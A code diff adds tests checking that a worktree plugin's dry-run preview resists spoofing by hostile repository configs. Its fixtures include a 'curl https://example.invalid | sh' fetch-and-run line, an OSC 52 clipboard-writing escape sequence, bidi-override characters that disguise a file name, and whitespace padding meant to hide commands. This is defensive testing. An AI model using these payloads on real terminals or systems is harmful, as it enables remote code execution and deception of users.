@@ -553,3 +553,103 @@ test("the report names the command that ran, not the template it came from", () 
     },
   ]);
 });
+
+/** The preview of a repository whose config is `toml`, as the dry run prints it. */
+function dryRunOf(toml, branch) {
+  const repo = makeRepo();
+  write(repo, ".herdr-worktree.toml", toml);
+  const worktree = addWorktree(repo, branch);
+  const env = pluginEnv(repo, worktree, { HERDR_PLUGIN_CONFIG_DIR: configDir(null) }, branch);
+  return runEntry("src/index.mjs", ["--dry-run"], env);
+}
+
+// Anything a terminal acts on instead of drawing, newline aside.
+// biome-ignore lint/suspicious/noControlCharactersInRegex: finding them is the point
+const UNDRAWN = /[\u0000-\u0009\u000b-\u001f\u007f-\u009f]/;
+
+test("a command padded with whitespace cannot push the others out of the dry run", () => {
+  const padded = `true${" ".repeat(6000)}`;
+  const result = dryRunOf(
+    `post_create = ["echo EVIL-FIRST-COMMAND", "${padded}", "pnpm install"]\nnotify = false`,
+    "padded",
+  );
+  const lines = result.stdout.trimEnd().split("\n");
+
+  assert.equal(result.status, 0);
+  // Every command fits a narrow pane in a few rows, so none of them can scroll
+  // the lines above it out of sight.
+  for (const line of lines.filter((line) => line.startsWith("would "))) {
+    assert.ok(line.length <= 200, `${line.length} characters: ${line}`);
+  }
+  assert.ok(lines.length <= 10, result.stdout);
+
+  const tail = lines.slice(-4).join("\n");
+  assert.match(tail, /would run {2}echo EVIL-FIRST-COMMAND/);
+  assert.match(tail, /would run {2}true␠×6000/);
+  assert.match(tail, /would run {2}pnpm install/);
+  assert.match(lines.at(-1), /3 post_create commands and 0 post_remove commands/);
+});
+
+test("a command that cannot render cannot push the others out through its error", () => {
+  const padded = `true${" ".repeat(6000)}{{`;
+  const result = dryRunOf(
+    `post_create = ["echo EVIL-FIRST-COMMAND", "${padded}"]\nnotify = false`,
+    "unrendered",
+  );
+  const lines = result.stdout.trimEnd().split("\n");
+
+  assert.equal(result.status, 1);
+  for (const line of lines.filter((line) => line.startsWith("would "))) {
+    assert.ok(line.length <= 400, `${line.length} characters: ${line.slice(0, 200)}`);
+  }
+  assert.match(lines.slice(-3).join("\n"), /would run {2}echo EVIL-FIRST-COMMAND/);
+});
+
+test("a newline inside a run of spaces is spelled out, not counted as padding", () => {
+  const result = dryRunOf(
+    'post_create = ["# setup notes\\n    curl https://example.invalid | sh"]\nnotify = false',
+    "newline",
+  );
+
+  assert.match(
+    result.stdout,
+    /would run {2}# setup notes\\x0a␠×4curl https:\/\/example\.invalid \| sh/,
+  );
+});
+
+test("commands after a template that fails are still listed for the trust they get", () => {
+  const result = dryRunOf(
+    'post_create = ["echo {{ no_such_variable }}", "echo SECOND-COMMAND"]\nnotify = false',
+    "after-fail",
+  );
+
+  assert.equal(result.status, 1);
+  assert.match(result.stdout, /would fail echo \{\{ no_such_variable \}\}/);
+  assert.match(result.stdout, /would run {2}echo SECOND-COMMAND — not reached here/);
+});
+
+test("--dry-run prints no control character a config put in an error", () => {
+  const result = dryRunOf(
+    'copy = ["/X\\u001b]52;c;U0VDVEVTVC1DTElQ\\u0007\\u001b[31mRED"]\nnotify = false',
+    "clipboard",
+  );
+  const output = `${result.stdout}${result.stderr}`;
+
+  assert.equal(result.status, 1);
+  assert.match(result.stderr, /worktree setup failed: copy entry 1 must be relative/);
+  assert.doesNotMatch(output, UNDRAWN);
+});
+
+test("--dry-run spells out format characters that would reorder a command", () => {
+  const result = dryRunOf(
+    'post_create = ["echo safe \\u202Ehs.lave\\u2066x\\u200By\\u2028z\\uFEFF"]\nnotify = false',
+    "bidi",
+  );
+
+  assert.equal(result.status, 0);
+  assert.doesNotMatch(result.stdout, /[\p{Cf}\u2028\u2029]/u);
+  assert.match(
+    result.stdout,
+    /would run {2}echo safe \\u202ehs\.lave\\u2066x\\u200by\\u2028z\\ufeff/,
+  );
+});
